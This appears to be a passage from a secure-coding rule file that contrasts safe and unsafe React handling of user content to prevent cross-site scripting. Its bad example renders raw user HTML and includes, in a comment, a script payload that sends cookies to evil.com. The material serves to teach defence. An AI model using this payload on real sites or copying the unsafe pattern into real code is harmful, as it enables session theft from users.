    framework: [frontend, react]
    library: [jinja2]
  domains:
    domain: [compliance, security, architecture]
    concern: [frontend]
  example_good: "// React: JSX auto-escapes by default — safe\nfunction UserComment({ comment }: { comment: string }) {\n\
    \  return <p className=\"comment\">{comment}</p>;  // auto-escaped\n}\n\n// For rich text: sanitize with DOMPurify\nimport\
    \ DOMPurify from \"dompurify\";\nfunction RichContent({ html }: { html: string }) {\n  const clean = DOMPurify.sanitize(html,\
    \ { ALLOWED_TAGS: [\"b\", \"i\", \"a\", \"p\"] });\n  return <div dangerouslySetInnerHTML={{ __html: clean }} />;\n}\n\
    \n// CSP header\n# Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src\
    \ 'self' data:; connect-src 'self' https://api.example.com\n"
  example_bad: "// Directly injecting user content as HTML — XSS vulnerability\nfunction UserComment({ comment }) {\n  return\
    \ <div dangerouslySetInnerHTML={{ __html: comment }} />;\n  // If comment = \"<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>\"\
    \n  // -> executes in every viewer's browser\n}\n\n// No CSP headers configured\n// Cookies without HttpOnly flag\n//\
    \ document.cookie accessible to injected scripts\n"
  when_applies: Any project using JavaScript/TypeScript projects, React component-based UIs, Python codebases, or Jinja2
  when_not_applies: purely internal tools with no external exposure, throwaway scripts, or local development utilities
